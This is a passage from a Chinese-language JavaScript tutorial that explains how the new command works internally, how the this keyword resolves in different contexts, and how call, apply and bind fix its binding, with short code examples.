        this._bar = bar;
      }
   
      Fubar(1, 2)._foo // 1
      (new Fubar(1, 2))._foo // 1

   上面代码中的构造函数，不管加不加 ``new`` 命令，都会得到同样的结果。

new 命令的原理
~~~~~~~~~~~~

   使用 ``new`` 命令时，它后面的函数依次执行下面的步骤。

   1. 创建一个空对象，作为将要返回的对象实例。
   1. 将这个空对象的原型，指向构造函数的 ``prototype`` 属性。
   1. 将这个空对象赋值给函数内部的 ``this`` 关键字。
   1. 开始执行构造函数内部的代码。

   也就是说，构造函数内部， ``this`` 指的是一个新生成的空对象，所有针对 ``this`` 的操作，都会发生在这个空对象上。构造函数之所以叫“构造函数”，就是说这个函数的目的，就是操作一个空对象（即 ``this`` 对象），将其“构造”为需要的样子。

   如果构造函数内部有 ``return`` 语句，而且 ``return`` 后面跟着一个对象， ``new`` 命令会返回 ``return`` 语句指定的对象；否则，就会不管 ``return`` 语句，返回 ``this`` 对象。

   .. code:: javascript

      var Vehicle = function () {
        this.price = 1000;
        return 1000;
      };
   
      (new Vehicle()) === 1000
      // false

   上面代码中，构造函数 ``Vehicle`` 的 ``return`` 语句返回一个数值。这时， ``new`` 命令就会忽略这个 ``return`` 语句，返回“构造”后的 ``this`` 对象。

   但是，如果 ``return`` 语句返回的是一个跟 ``this`` 无关的新对象， ``new`` 命令会返回这个新对象，而不是 ``this`` 对象。这一点需要特别引起注意。

   .. code:: javascript

      var Vehicle = function (){
        this.price = 1000;
        return { price: 2000 };
      };
   
      (new Vehicle()).price
      // 2000

   上面代码中，构造函数 ``Vehicle`` 的 ``return`` 语句，返回的是一个新对象。 ``new`` 命令会返回这个对象，而不是 ``this`` 对象。

   另一方面，如果对普通函数（内部没有 ``this`` 关键字的函数）使用 ``new`` 命令，则会返回一个空对象。

   .. code:: javascript

      function getMessage() {
        return 'this is a message';
      }
   
      var msg = new getMessage();
   
      msg // {}
      typeof msg // "object"

   上面代码中， ``getMessage`` 是一个普通函数，返回一个字符串。对它使用 ``new`` 命令，会得到一个空对象。这是因为 ``new`` 命令总是返回一个对象，要么是实例对象，要么是 ``return`` 语句指定的对象。本例中， ``return`` 语句返回的是字符串，所以 ``new`` 命令就忽略了该语句。

    ``new`` 命令简化的内部流程，可以用下面的代码表示。

   .. code:: javascript

      function _new(/* 构造函数 */ constructor, /* 构造函数参数 */ params) {
        // 将 arguments 对象转为数组
        var args = [].slice.call(arguments);
        // 取出构造函数
        var constructor = args.shift();
        // 创建一个空对象，继承构造函数的 prototype 属性
        var context = Object.create(constructor.prototype);
        // 执行构造函数
        var result = constructor.apply(context, args);
        // 如果返回结果是对象，就直接返回，否则返回 context 对象
        return (typeof result === 'object' && result != null) ? result : context;
      }
   
      // 实例
      var actor = _new(Person, '张三', 28);

new.target
~~~~~~~~~~~

   函数内部可以使用 ``new.target`` 属性。如果当前函数是 ``new`` 命令调用， ``new.target`` 指向当前函数，否则为 ``undefined`` 。

   .. code:: javascript

      function f() {
        console.log(new.target === f);
      }
   
      f() // false
      new f() // true

   使用这个属性，可以判断函数调用的时候，是否使用 ``new`` 命令。

   .. code:: javascript

      function f() {
        if (!new.target) {
          throw new Error('请使用 new 命令调用！');
        }
        // ...
      }
   
      f() // Uncaught Error: 请使用 new 命令调用！

   上面代码中，构造函数 ``f`` 调用时，没有使用 ``new`` 命令，就抛出一个错误。

Object.create() 创建实例对象
--------------------------

   构造函数作为模板，可以生成实例对象。但是，有时拿不到构造函数，只能拿到一个现有的对象。我们希望以这个现有的对象作为模板，生成新的实例对象，这时就可以使用 ``Object.create()`` 方法。

   .. code:: javascript

      var person1 = {
        name: '张三',
        age: 38,
        greeting: function() {
          console.log('Hi! I\'m ' + this.name + '.');
        }
      };
   
      var person2 = Object.create(person1);
   
      person2.name // 张三
      person2.greeting() // Hi! I'm 张三.

   上面代码中，对象 ``person1`` 是 ``person2`` 的模板，后者继承了前者的属性和方法。

    ``Object.create()`` 的详细介绍，请看后面的相关章节。

/🟠 this 关键字
==============

涵义
---

    ``this`` 关键字是一个非常重要的语法点。毫不夸张地说，不理解它的含义，大部分开发任务都无法完成。

   前一章已经提到， ``this`` 可以用在构造函数之中，表示实例对象。除此之外， ``this`` 还可以用在别的场合。但不管是什么场合， ``this`` 都有一个共同点：它总是返回一个对象。

   简单说， ``this`` 就是属性或方法“当前”所在的对象。

   .. code:: javascript

      this.property

   上面代码中， ``this`` 就代表 ``property`` 属性当前所在的对象。

   下面是一个实际的例子。

   .. code:: javascript

      var person = {
        name: '张三',
        describe: function () {
          return '姓名：'+ this.name;
        }
      };
   
      person.describe()
      // "姓名：张三"

   上面代码中， ``this.name`` 表示 ``name`` 属性所在的那个对象。由于 ``this.name`` 是在 ``describe`` 方法中调用，而 ``describe`` 方法所在的当前对象是 ``person`` ，因此 ``this`` 指向 ``person`` ， ``this.name`` 就是 ``person.name`` 。

   由于对象的属性可以赋给另一个对象，所以属性所在的当前对象是可变的，即 ``this`` 的指向是可变的。

   .. code:: javascript

      var A = {
        name: '张三',
        describe: function () {
          return '姓名：'+ this.name;
        }
      };
   
      var B = {
        name: '李四'
      };
   
      B.describe = A.describe;
      B.describe()
      // "姓名：李四"

   上面代码中， ``A.describe`` 属性被赋给 ``B`` ，于是 ``B.describe`` 就表示 ``describe`` 方法所在的当前对象是 ``B`` ，所以 ``this.name`` 就指向 ``B.name`` 。

   稍稍重构这个例子， ``this`` 的动态指向就能看得更清楚。

   .. code:: javascript

      function f() {
        return '姓名：'+ this.name;
      }
   
      var A = {
        name: '张三',
        describe: f
      };
   
      var B = {
        name: '李四',
        describe: f
      };
   
      A.describe() // "姓名：张三"
      B.describe() // "姓名：李四"

   上面代码中，函数 ``f`` 内部使用了 ``this`` 关键字，随着 ``f`` 所在的对象不同， ``this`` 的指向也不同。

   只要函数被赋给另一个变量， ``this`` 的指向就会变。

   .. code:: javascript

      var A = {
        name: '张三',
        describe: function () {
          return '姓名：'+ this.name;
        }
      };
   
      var name = '李四';
      var f = A.describe;
      f() // "姓名：李四"

   上面代码中， ``A.describe`` 被赋值给变量 ``f`` ，内部的 ``this`` 就会指向 ``f`` 运行时所在的对象（本例是顶层对象）。

   再看一个网页编程的例子。

   .. code:: html

      <input type="text" name="age" size=3 onChange="validate(this, 18, 99);">
   
      <script>
      function validate(obj, lowval, hival){
        if ((obj.value < lowval) || (obj.value > hival))
          console.log('Invalid Value!');
      }
      </script>

   上面代码是一个文本输入框，每当用户输入一个值，就会调用 ``onChange`` 回调函数，验证这个值是否在指定范围。浏览器会向回调函数传入当前对象，因此 ``this`` 就代表传入当前对象（即文本框），然后就可以从 ``this.value`` 上面读到用户的输入值。

   总结一下，JavaScript 语言之中，一切皆对象，运行环境也是对象，所以函数都是在某个对象之中运行， ``this`` 就是函数运行时所在的对象（环境）。这本来并不会让用户糊涂，但是 JavaScript 支持运行环境动态切换，也就是说， ``this`` 的指向是动态的，没有办法事先确定到底指向哪个对象，这才是最让初学者感到困惑的地方。

实质
---

   JavaScript 语言之所以有 this 的设计，跟内存里面的数据结构有关系。

   .. code:: javascript

      var obj = { foo:  5 };

   上面的代码将一个对象赋值给变量 ``obj`` 。JavaScript 引擎会先在内存里面，生成一个对象 ``{ foo: 5 }`` ，然后把这个对象的内存地址赋值给变量 ``obj`` 。也就是说，变量 ``obj`` 是一个地址（reference）。后面如果要读取 ``obj.foo`` ，引擎先从 ``obj`` 拿到内存地址，然后再从该地址读出原始的对象，返回它的 ``foo`` 属性。

   原始的对象以字典结构保存，每一个属性名都对应一个属性描述对象。举例来说，上面例子的 ``foo`` 属性，实际上是以下面的形式保存的。

   .. code:: javascript

      {
        foo: {
          [[value]]: 5
          [[writable]]: true
          [[enumerable]]: true
          [[configurable]]: true
        }
      }

   注意， ``foo`` 属性的值保存在属性描述对象的 ``value`` 属性里面。

   这样的结构是很清晰的，问题在于属性的值可能是一个函数。

   .. code:: javascript

      var obj = { foo: function () {} };

   这时，引擎会将函数单独保存在内存中，然后再将函数的地址赋值给 ``foo`` 属性的 ``value`` 属性。

   .. code:: javascript

      {
        foo: {
          [[value]]: 函数的地址
          ...
        }
      }

   由于函数是一个单独的值，所以它可以在不同的环境（上下文）执行。

   .. code:: javascript

      var f = function () {};
      var obj = { f: f };
   
      // 单独执行
      f()
   
      // obj 环境执行
      obj.f()

   JavaScript 允许在函数体内部，引用当前环境的其他变量。

   .. code:: javascript

      var f = function () {
        console.log(x);
      };

   上面代码中，函数体里面使用了变量 ``x`` 。该变量由运行环境提供。

   现在问题就来了，由于函数可以在不同的运行环境执行，所以需要有一种机制，能够在函数体内部获得当前的运行环境（context）。所以， ``this`` 就出现了，它的设计目的就是在函数体内部，指代函数当前的运行环境。

   .. code:: javascript

      var f = function () {
        console.log(this.x);
      }

   上面代码中，函数体里面的 ``this.x`` 就是指当前运行环境的 ``x`` 。

   .. code:: javascript

      var f = function () {
        console.log(this.x);
      }
   
      var x = 1;
      var obj = {
        f: f,
        x: 2,
      };
   
      // 单独执行
      f() // 1
   
      // obj 环境执行
      obj.f() // 2

   上面代码中，函数 ``f`` 在全局环境执行， ``this.x`` 指向全局环境的 ``x`` ；在 ``obj`` 环境执行， ``this.x`` 指向 ``obj.x`` 。

使用场合
-------

    ``this`` 主要有以下几个使用场合。

   **（1）全局环境**

   全局环境使用 ``this`` ，它指的就是顶层对象 ``window`` 。

   .. code:: javascript

      this === window // true
   
      function f() {
        console.log(this === window);
      }
      f() // true

   上面代码说明，不管是不是在函数内部，只要是在全局环境下运行， ``this`` 就是指顶层对象 ``window`` 。

   **（2）构造函数**

   构造函数中的 ``this`` ，指的是实例对象。

   .. code:: javascript

      var Obj = function (p) {
        this.p = p;
      };

   上面代码定义了一个构造函数 ``Obj`` 。由于 ``this`` 指向实例对象，所以在构造函数内部定义 ``this.p`` ，就相当于定义实例对象有一个 ``p`` 属性。

   .. code:: javascript

      var o = new Obj('Hello World!');
      o.p // "Hello World!"

   **（3）对象的方法**

   如果对象的方法里面包含 ``this`` ， ``this`` 的指向就是方法运行时所在的对象。该方法赋值给另一个对象，就会改变 ``this`` 的指向。

   但是，这条规则很不容易把握。请看下面的代码。

   .. code:: javascript

      var obj ={
        foo: function () {
          console.log(this);
        }
      };
   
      obj.foo() // obj

   上面代码中， ``obj.foo`` 方法执行时，它内部的 ``this`` 指向 ``obj`` 。

   但是，下面这几种用法，都会改变 ``this`` 的指向。

   .. code:: javascript

      // 情况一
      (obj.foo = obj.foo)() // window
      // 情况二
      (false || obj.foo)() // window
      // 情况三
      (1, obj.foo)() // window

   上面代码中， ``obj.foo`` 就是一个值。这个值真正调用的时候，运行环境已经不是 ``obj`` 了，而是全局环境，所以 ``this`` 不再指向 ``obj`` 。

   可以这样理解，JavaScript 引擎内部， ``obj`` 和 ``obj.foo`` 储存在两个内存地址，称为地址一和地址二。 ``obj.foo()`` 这样调用时，是从地址一调用地址二，因此地址二的运行环境是地址一， ``this`` 指向 ``obj`` 。但是，上面三种情况，都是直接取出地址二进行调用，这样的话，运行环境就是全局环境，因此 ``this`` 指向全局环境。上面三种情况等同于下面的代码。

   .. code:: javascript

      // 情况一
      (obj.foo = function () {
        console.log(this);
      })()
      // 等同于
      (function () {
        console.log(this);
      })()
   
      // 情况二
      (false || function () {
        console.log(this);
      })()
   
      // 情况三
      (1, function () {
        console.log(this);
      })()

   如果 ``this`` 所在的方法不在对象的第一层，这时 ``this`` 只是指向当前一层的对象，而不会继承更上面的层。

   .. code:: javascript

      var a = {
        p: 'Hello',
        b: {
          m: function() {
            console.log(this.p);
          }
        }
      };
   
      a.b.m() // undefined

   上面代码中， ``a.b.m`` 方法在 ``a`` 对象的第二层，该方法内部的 ``this`` 不是指向 ``a`` ，而是指向 ``a.b`` ，因为实际执行的是下面的代码。

   .. code:: javascript

      var b = {
        m: function() {
         console.log(this.p);
        }
      };
   
      var a = {
        p: 'Hello',
        b: b
      };
   
      (a.b).m() // 等同于 b.m()

   如果要达到预期效果，只有写成下面这样。

   .. code:: javascript

      var a = {
        b: {
          m: function() {
            console.log(this.p);
          },
          p: 'Hello'
        }
      };

   如果这时将嵌套对象内部的方法赋值给一个变量， ``this`` 依然会指向全局对象。

   .. code:: javascript

      var a = {
        b: {
          m: function() {
            console.log(this.p);
          },
          p: 'Hello'
        }
      };
   
      var hello = a.b.m;
      hello() // undefined

   上面代码中， ``m`` 是多层对象内部的一个方法。为求简便，将其赋值给 ``hello`` 变量，结果调用时， ``this`` 指向了顶层对象。为了避免这个问题，可以只将 ``m`` 所在的对象赋值给 ``hello`` ，这样调用时， ``this`` 的指向就不会变。

   .. code:: javascript

      var hello = a.b;
      hello.m() // Hello

使用注意点
--------


避免多层 this
~~~~~~~~~~~~

   由于 ``this`` 的指向是不确定的，所以切勿在函数中包含多层的 ``this`` 。

   .. code:: javascript

      var o = {
        f1: function () {
          console.log(this);
          var f2 = function () {
            console.log(this);
          }();
        }
      }
   
      o.f1()
      // Object
      // Window

   上面代码包含两层 ``this`` ，结果运行后，第一层指向对象 ``o`` ，第二层指向全局对象，因为实际执行的是下面的代码。

   .. code:: javascript

      var temp = function () {
        console.log(this);
      };
   
      var o = {
        f1: function () {
          console.log(this);
          var f2 = temp();
        }
      }

   一个解决方法是在第二层改用一个指向外层 ``this`` 的变量。

   .. code:: javascript

      var o = {
        f1: function() {
          console.log(this);
          var that = this;
          var f2 = function() {
            console.log(that);
          }();
        }
      }
   
      o.f1()
      // Object
      // Object

   上面代码定义了变量 ``that`` ，固定指向外层的 ``this`` ，然后在内层使用 ``that`` ，就不会发生 ``this`` 指向的改变。

   事实上，使用一个变量固定 ``this`` 的值，然后内层函数调用这个变量，是非常常见的做法，请务必掌握。

   JavaScript 提供了严格模式，也可以硬性避免这种问题。严格模式下，如果函数内部的 ``this`` 指向顶层对象，就会报错。

   .. code:: javascript

      var counter = {
        count: 0
      };
      counter.inc = function () {
        'use strict';
        this.count++
      };
      var f = counter.inc;
      f()
      // TypeError: Cannot read property 'count' of undefined

   上面代码中， ``inc`` 方法通过 ``'use strict'`` 声明采用严格模式，这时内部的 ``this`` 一旦指向顶层对象，就会报错。

避免数组处理方法中的 this
~~~~~~~~~~~~~~~~~~~~~~

   数组的 ``map`` 和 ``foreach`` 方法，允许提供一个函数作为参数。这个函数内部不应该使用 ``this`` 。

   .. code:: javascript

      var o = {
        v: 'hello',
        p: [ 'a1', 'a2' ],
        f: function f() {
          this.p.forEach(function (item) {
            console.log(this.v + ' ' + item);
          });
        }
      }
   
      o.f()
      // undefined a1
      // undefined a2

   上面代码中， ``foreach`` 方法的回调函数中的 ``this`` ，其实是指向 ``window`` 对象，因此取不到 ``o.v`` 的值。原因跟上一段的多层 ``this`` 是一样的，就是内层的 ``this`` 不指向外部，而指向顶层对象。

   解决这个问题的一种方法，就是前面提到的，使用中间变量固定 ``this`` 。

   .. code:: javascript

      var o = {
        v: 'hello',
        p: [ 'a1', 'a2' ],
        f: function f() {
          var that = this;
          this.p.forEach(function (item) {
            console.log(that.v+' '+item);
          });
        }
      }
   
      o.f()
      // hello a1
      // hello a2

   另一种方法是将 ``this`` 当作 ``foreach`` 方法的第二个参数，固定它的运行环境。

   .. code:: javascript

      var o = {
        v: 'hello',
        p: [ 'a1', 'a2' ],
        f: function f() {
          this.p.forEach(function (item) {
            console.log(this.v + ' ' + item);
          }, this);
        }
      }
   
      o.f()
      // hello a1
      // hello a2

避免回调函数中的 this
~~~~~~~~~~~~~~~~~~~

   回调函数中的 ``this`` 往往会改变指向，最好避免使用。

   .. code:: javascript

      var o = new Object();
      o.f = function () {
        console.log(this === o);
      }
   
      // jQuery 的写法
      $('#button').on('click', o.f);

   上面代码中，点击按钮以后，控制台会显示 ``false`` 。原因是此时 ``this`` 不再指向 ``o`` 对象，而是指向按钮的 DOM 对象，因为 ``f`` 方法是在按钮对象的环境中被调用的。这种细微的差别，很容易在编程中忽视，导致难以察觉的错误。

   为了解决这个问题，可以采用下面的一些方法对 ``this`` 进行绑定，也就是使得 ``this`` 固定指向某个对象，减少不确定性。

绑定 this 的方法
--------------

    ``this`` 的动态切换，固然为 JavaScript 创造了巨大的灵活性，但也使得编程变得困难和模糊。有时，需要把 ``this`` 固定下来，避免出现意想不到的情况。JavaScript 提供了 ``call`` 、 ``apply`` 、 ``bind`` 这三个方法，来切换/固定 ``this`` 的指向。

Function.prototype.call()
~~~~~~~~~~~~~~~~~~~~~~~~~~

   函数实例的 ``call`` 方法，可以指定函数内部 ``this`` 的指向（即函数执行时所在的作用域），然后在所指定的作用域中，调用该函数。

   .. code:: javascript

      var obj = {};
   
      var f = function () {
        return this;
      };
   
      f() === window // true
      f.call(obj) === obj // true

   上面代码中，全局环境运行函数 ``f`` 时， ``this`` 指向全局环境（浏览器为 ``window`` 对象）； ``call`` 方法可以改变 ``this`` 的指向，指定 ``this`` 指向对象 ``obj`` ，然后在对象 ``obj`` 的作用域中运行函数 ``f`` 。

    ``call`` 方法的参数，应该是一个对象。如果参数为空、 ``null`` 和 ``undefined`` ，则默认传入全局对象。

   .. code:: javascript

      var n = 123;
      var obj = { n: 456 };
   
      function a() {
        console.log(this.n);
      }
   
      a.call() // 123
      a.call(null) // 123
      a.call(undefined) // 123
      a.call(window) // 123
      a.call(obj) // 456

   上面代码中， ``a`` 函数中的 ``this`` 关键字，如果指向全局对象，返回结果为 ``123`` 。如果使用 ``call`` 方法将 ``this`` 关键字指向 ``obj`` 对象，返回结果为 ``456`` 。可以看到，如果 ``call`` 方法没有参数，或者参数为 ``null`` 或 ``undefined`` ，则等同于指向全局对象。

   如果 ``call`` 方法的参数是一个原始值，那么这个原始值会自动转成对应的包装对象，然后传入 ``call`` 方法。

   .. code:: javascript

      var f = function () {
        return this;
      };
   
      f.call(5)
      // Number {[[PrimitiveValue]]: 5}

   上面代码中， ``call`` 的参数为 ``5`` ，不是对象，会被自动转成包装对象（ ``Number`` 的实例），绑定 ``f`` 内部的 ``this`` 。

    ``call`` 方法还可以接受多个参数。

   .. code:: javascript

      func.call(thisValue, arg1, arg2, ...)

    ``call`` 的第一个参数就是 ``this`` 所要指向的那个对象，后面的参数则是函数调用时所需的参数。

   .. code:: javascript

      function add(a, b) {
        return a + b;
      }
   
      add.call(this, 1, 2) // 3

   上面代码中， ``call`` 方法指定函数 ``add`` 内部的 ``this`` 绑定当前环境（对象），并且参数为 ``1`` 和 ``2`` ，因此函数 ``add`` 运行后得到 ``3`` 。

    ``call`` 方法的一个应用是调用对象的原生方法。

   .. code:: javascript

      var obj = {};
      obj.hasOwnProperty('toString') // false
   
      // 覆盖掉继承的 hasOwnProperty 方法
      obj.hasOwnProperty = function () {
        return true;
      };
      obj.hasOwnProperty('toString') // true
   
      Object.prototype.hasOwnProperty.call(obj, 'toString') // false

   上面代码中， ``hasOwnProperty`` 是 ``obj`` 对象继承的方法，如果这个方法一旦被覆盖，就不会得到正确结果。 ``call`` 方法可以解决这个问题，它将 ``hasOwnProperty`` 方法的原始定义放到 ``obj`` 对象上执行，这样无论 ``obj`` 上有没有同名方法，都不会影响结果。

Function.prototype.apply()
~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``apply`` 方法的作用与 ``call`` 方法类似，也是改变 ``this`` 指向，然后再调用该函数。唯一的区别就是，它接收一个数组作为函数执行时的参数，使用格式如下。

   .. code:: javascript

      func.apply(thisValue, [arg1, arg2, ...])

    ``apply`` 方法的第一个参数也是 ``this`` 所要指向的那个对象，如果设为 ``null`` 或 ``undefined`` ，则等同于指定全局对象。第二个参数则是一个数组，该数组的所有成员依次作为参数，传入原函数。原函数的参数，在 ``call`` 方法中必须一个个添加，但是在 ``apply`` 方法中，必须以数组形式添加。

   .. code:: javascript

      function f(x, y){
        console.log(x + y);
      }
   
      f.call(null, 1, 1) // 2
      f.apply(null, [1, 1]) // 2

   上面代码中， ``f`` 函数本来接受两个参数，使用 ``apply`` 方法以后，就变成可以接受一个数组作为参数。

   利用这一点，可以做一些有趣的应用。

   **（1）找出数组最大元素**

   JavaScript 不提供找出数组最大元素的函数。结合使用 ``apply`` 方法和 ``Math.max`` 方法，就可以返回数组的最大元素。

   .. code:: javascript

      var a = [10, 2, 4, 15, 9];
      Math.max.apply(null, a) // 15

   **（2）将数组的空元素变为 ``undefined`` **

   通过 ``apply`` 方法，利用 ``Array`` 构造函数将数组的空元素变成 ``undefined`` 。

   .. code:: javascript

      Array.apply(null, ['a', ,'b'])
      // [ 'a', undefined, 'b' ]

   空元素与 ``undefined`` 的差别在于，数组的 ``forEach`` 方法会跳过空元素，但是不会跳过 ``undefined`` 。因此，遍历内部元素的时候，会得到不同的结果。

   .. code:: javascript

      var a = ['a', , 'b'];
   
      function print(i) {
        console.log(i);
      }
   
      a.forEach(print)
      // a
      // b
   
      Array.apply(null, a).forEach(print)
      // a
      // undefined
      // b

   **（3）转换类似数组的对象**

   另外，利用数组对象的 ``slice`` 方法，可以将一个类似数组的对象（比如 ``arguments`` 对象）转为真正的数组。

   .. code:: javascript

      Array.prototype.slice.apply({0: 1, length: 1}) // [1]
      Array.prototype.slice.apply({0: 1}) // []
      Array.prototype.slice.apply({0: 1, length: 2}) // [1, undefined]
      Array.prototype.slice.apply({length: 1}) // [undefined]

   上面代码的 ``apply`` 方法的参数都是对象，但是返回结果都是数组，这就起到了将对象转成数组的目的。从上面代码可以看到，这个方法起作用的前提是，被处理的对象必须有 ``length`` 属性，以及相对应的数字键。

   **（4）绑定回调函数的对象**

   前面的按钮点击事件的例子，可以改写如下。

   .. code:: javascript

      var obj = new Object();
   
      var func = function () {
        console.log(this === obj);
      }
   
      var handler = function (){
        func.apply(obj);
        // 或者 f.call(obj);
      };
   
      // jQuery 的写法
      $('#button').on('click', handler);

   上面代码中，点击按钮以后，控制台将会显示 ``true`` 。由于 ``apply()`` 方法（或者 ``call()`` 方法）不仅绑定函数执行时所在的对象，还会立即执行函数，因此不得不把绑定语句写在一个函数体内。更简洁的写法是采用下面介绍的 ``bind()`` 方法。

Function.prototype.bind()
~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``bind()`` 方法用于将函数体内的 ``this`` 绑定到某个对象，然后返回一个新函数。

   .. code:: javascript

      var d = new Date();
      d.getTime() // 1481869925657
   
      var print = d.getTime;
      print() // Uncaught TypeError: this is not a Date object.

   上面代码中，我们将 ``d.getTime()`` 方法赋给变量 ``print`` ，然后调用 ``print()`` 就报错了。这是因为 ``getTime()`` 方法内部的 ``this`` ，绑定 ``Date`` 对象的实例，赋给变量 ``print`` 以后，内部的 ``this`` 已经不指向 ``Date`` 对象的实例了。

    ``bind()`` 方法可以解决这个问题。

   .. code:: javascript

      var print = d.getTime.bind(d);
      print() // 1481869925657

   上面代码中， ``bind()`` 方法将 ``getTime()`` 方法内部的 ``this`` 绑定到 ``d`` 对象，这时就可以安全地将这个方法赋值给其他变量了。

    ``bind`` 方法的参数就是所要绑定 ``this`` 的对象，下面是一个更清晰的例子。

   .. code:: javascript

      var counter = {
        count: 0,
        inc: function () {
          this.count++;
        }
      };
   
      var func = counter.inc.bind(counter);
      func();
      counter.count // 1

   上面代码中， ``counter.inc()`` 方法被赋值给变量 ``func`` 。这时必须用 ``bind()`` 方法将 ``inc()`` 内部的 ``this`` ，绑定到 ``counter`` ，否则就会出错。

    ``this`` 绑定到其他对象也是可以的。

   .. code:: javascript

      var counter = {
        count: 0,
        inc: function () {
          this.count++;
        }
      };
   
      var obj = {
        count: 100
      };
      var func = counter.inc.bind(obj);
      func();
      obj.count // 101

   上面代码中， ``bind()`` 方法将 ``inc()`` 方法内部的 ``this`` ，绑定到 ``obj`` 对象。结果调用 ``func`` 函数以后，递增的就是 ``obj`` 内部的 ``count`` 属性。

    ``bind()`` 还可以接受更多的参数，将这些参数绑定原函数的参数。

   .. code:: javascript

      var add = function (x, y) {
        return x * this.m + y * this.n;
      }
   
      var obj = {
        m: 2,
        n: 2
      };
   
      var newAdd = add.bind(obj, 5);
      newAdd(5) // 20

   上面代码中， ``bind()`` 方法除了绑定 ``this`` 对象，还将 ``add()`` 函数的第一个参数 ``x`` 绑定成 ``5`` ，然后返回一个新函数 ``newAdd()`` ，这个函数只要再接受一个参数 ``y`` 就能运行了。

   如果 ``bind()`` 方法的第一个参数是 ``null`` 或 ``undefined`` ，等于将 ``this`` 绑定到全局对象，函数运行时 ``this`` 指向顶层对象（浏览器为 ``window`` ）。

   .. code:: javascript

      function add(x, y) {
        return x + y;
      }
   
      var plus5 = add.bind(null, 5);
      plus5(10) // 15

   上面代码中，函数 ``add()`` 内部并没有 ``this`` ，使用 ``bind()`` 方法的主要目的是绑定参数 ``x`` ，以后每次运行新函数 ``plus5()`` ，就只需要提供另一个参数 ``y`` 就够了。而且因为 ``add()`` 内部没有 ``this`` ，所以 ``bind()`` 的第一个参数是 ``null`` ，不过这里如果是其他对象，也没有影响。

    ``bind()`` 方法有一些使用注意点。

   **（1）每一次返回一个新函数**

    ``bind()`` 方法每运行一次，就返回一个新函数，这会产生一些问题。比如，监听事件的时候，不能写成下面这样。

   .. code:: javascript

      element.addEventListener('click', o.m.bind(o));

   上面代码中， ``click`` 事件绑定 ``bind()`` 方法生成的一个匿名函数。这样会导致无法取消绑定，所以下面的代码是无效的。

   .. code:: javascript

      element.removeEventListener('click', o.m.bind(o));

   正确的方法是写成下面这样：

   .. code:: javascript

      var listener = o.m.bind(o);
      element.addEventListener('click', listener);
      //  ...
      element.removeEventListener('click', listener);

   **（2）结合回调函数使用**

   回调函数是 JavaScript 最常用的模式之一，但是一个常见的错误是，将包含 ``this`` 的方法直接当作回调函数。解决方法就是使用 ``bind()`` 方法，将 ``counter.inc()`` 绑定 ``counter`` 。

   .. code:: javascript

      var counter = {
        count: 0,
        inc: function () {
          'use strict';
          this.count++;
        }
      };
   
      function callIt(callback) {
        callback();
      }
   
      callIt(counter.inc.bind(counter));
      counter.count // 1

   上面代码中， ``callIt()`` 方法会调用回调函数。这时如果直接把 ``counter.inc`` 传入，调用时 ``counter.inc()`` 内部的 ``this`` 就会指向全局对象。使用 ``bind()`` 方法将 ``counter.inc`` 绑定 ``counter`` 以后，就不会有这个问题， ``this`` 总是指向 ``counter`` 。

   还有一种情况比较隐蔽，就是某些数组方法可以接受一个函数当作参数。这些函数内部的 ``this`` 指向，很可能也会出错。

   .. code:: javascript

      var obj = {
        name: '张三',
        times: [1, 2, 3],
        print: function () {
          this.times.forEach(function (n) {
            console.log(this.name);
          });
        }
      };
   
      obj.print()
      // 没有任何输出

   上面代码中， ``obj.print`` 内部 ``this.times`` 的 ``this`` 是指向 ``obj`` 的，这个没有问题。但是， ``forEach()`` 方法的回调函数内部的 ``this.name`` 却是指向全局对象，导致没有办法取到值。稍微改动一下，就可以看得更清楚。

   .. code:: javascript

      obj.print = function () {
        this.times.forEach(function (n) {
          console.log(this === window);
        });
      };
   
      obj.print()
      // true
      // true
      // true

   解决这个问题，也是通过 ``bind()`` 方法绑定 ``this`` 。

   .. code:: javascript

      obj.print = function () {
        this.times.forEach(function (n) {
          console.log(this.name);
        }.bind(this));
      };
   
      obj.print()
      // 张三
      // 张三
      // 张三

   **（3）结合 ``call()`` 方法使用**

   利用 ``bind()`` 方法，可以改写一些 JavaScript 原生方法的使用形式，以数组的 ``slice()`` 方法为例。

   .. code:: javascript

      [1, 2, 3].slice(0, 1) // [1]
      // 等同于
      Array.prototype.slice.call([1, 2, 3], 0, 1) // [1]

   上面的代码中，数组的 ``slice`` 方法从 ``[1, 2, 3]`` 里面，按照指定的开始位置和结束位置，切分出另一个数组。这样做的本质是在 ``[1, 2, 3]`` 上面调用 ``Array.prototype.slice()`` 方法，因此可以用 ``call`` 方法表达这个过程，得到同样的结果。

    ``call()`` 方法实质上是调用 ``Function.prototype.call()`` 方法，因此上面的表达式可以用 ``bind()`` 方法改写。

   .. code:: javascript

      var slice = Function.prototype.call.bind(Array.prototype.slice);
      slice([1, 2, 3], 0, 1) // [1]

   上面代码的含义就是，将 ``Array.prototype.slice`` 变成 ``Function.prototype.call`` 方法所在的对象，调用时就变成了 ``Array.prototype.slice.call`` 。类似的写法还可以用于其他数组方法。

   .. code:: javascript

      var push = Function.prototype.call.bind(Array.prototype.push);
      var pop = Function.prototype.call.bind(Array.prototype.pop);
   
      var a = [1 ,2 ,3];
      push(a, 4)
      a // [1, 2, 3, 4]
   
      pop(a)
      a // [1, 2, 3]

   如果再进一步，将 ``Function.prototype.call`` 方法绑定到 ``Function.prototype.bind`` 对象，就意味着 ``bind`` 的调用形式也可以被改写。

   .. code:: javascript

      function f() {
        console.log(this.v);
      }
   
      var o = { v: 123 };
      var bind = Function.prototype.call.bind(Function.prototype.bind);
      bind(f, o)() // 123

   上面代码的含义就是，将 ``Function.prototype.bind`` 方法绑定在 ``Function.prototype.call`` 上面，所以 ``bind`` 方法就可以直接使用，不需要在函数实例上使用。

参考链接
-------

   - Jonathan Creamer, [Avoiding the "this" problem in JavaScript](http://tech.pro/tutorial/1192/avoiding-the-this-problem-in-javascript)
   - Erik Kronberg, [Bind, Call and Apply in JavaScript](https://variadic.me/posts/2013-10-22-bind-call-and-apply-in-javascript.html)
   - Axel Rauschmayer, [JavaScript’s this: how it works, where it can trip you up](http://www.2ality.com/2014/05/this.html)

/🟠 对象的继承
=============

   面向对象编程很重要的一个方面，就是对象的继承。A 对象通过继承 B 对象，就能直接拥有 B 对象的所有属性和方法。这对于代码的复用是非常有用的。

   大部分面向对象的编程语言，都是通过“类”（class）实现对象的继承。传统上，JavaScript 语言的继承不通过 class，而是通过“原型对象”（prototype）实现，本章介绍 JavaScript 的原型链继承。

   ES6 引入了 class 语法，基于 class 的继承不在这个教程介绍，请参阅《ES6 标准入门》一书的相关章节。

原型对象概述
----------


构造函数的缺点
~~~~~~~~~~~~

